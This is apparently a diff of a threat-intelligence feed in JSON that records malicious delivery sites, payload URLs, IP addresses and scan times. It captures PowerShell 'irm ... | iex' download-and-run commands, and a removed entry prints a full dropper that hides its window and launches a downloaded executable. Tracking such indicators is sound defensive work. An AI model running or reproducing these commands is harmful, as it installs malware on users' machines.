@@ -1,5 +1,43 @@
 [
   {
+    "UrlDomain": "www.etaic.org",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/a49871b1ae44d6d5"
+    ],
+    "IP": [
+      "157.90.71.19"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/a49871b1ae44d6d5')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/a49871b1ae44d6d5"
+    ],
+    "ReportId": "cmwpowk8923to0omlpmzxz9ut",
+    "ScannedAt": "2026-11-21T00:48:49.049000+00:00"
+  },
+  {
+    "UrlDomain": "3elife.vn",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/615573e32a14a9bc"
+    ],
+    "IP": [
+      "103.200.23.19"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/615573e32a14a9bc')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/615573e32a14a9bc"
+    ],
+    "ReportId": "cmwpowabb23s00omlnjfvwnz5",
+    "ScannedAt": "2026-11-21T00:48:36.215000+00:00"
+  },
+  {
     "UrlDomain": "www.iccc-cairo.com",
     "DeliveryUrl": [
       "xlfsgudhiaokbioa.sisterleveling.com"
@@ -9306,51 +9344,5 @@
     ],
     "ReportId": "cmwiosojj10g80omlecnzsl55",
     "ScannedAt": "2026-11-16T03:11:24.720000+00:00"
-  },
-  {
-    "UrlDomain": "balifusarongs.com",
-    "DeliveryUrl": [
-      "biboiboboorl.org"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "192.185.136.163"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881"
-    ],
-    "ReportId": "cmwijm8za0zxz0omlgbyn6tef",
-    "ScannedAt": "2026-11-16T00:46:26.607000+00:00"
-  },
-  {
-    "UrlDomain": "exploratlantico.com",
-    "DeliveryUrl": [
-      "fbifr.com"
-    ],
-    "PayloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "IP": [
-      "147.93.42.88"
-    ],
-    "Related": [
-      {
-        "Value": "https://fbifr.com/ca.js",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "ReportId": "cmwijlxrh0zwy0omlmlk3hhqx",
-    "ScannedAt": "2026-11-16T00:46:11.976000+00:00"
   }
 ]
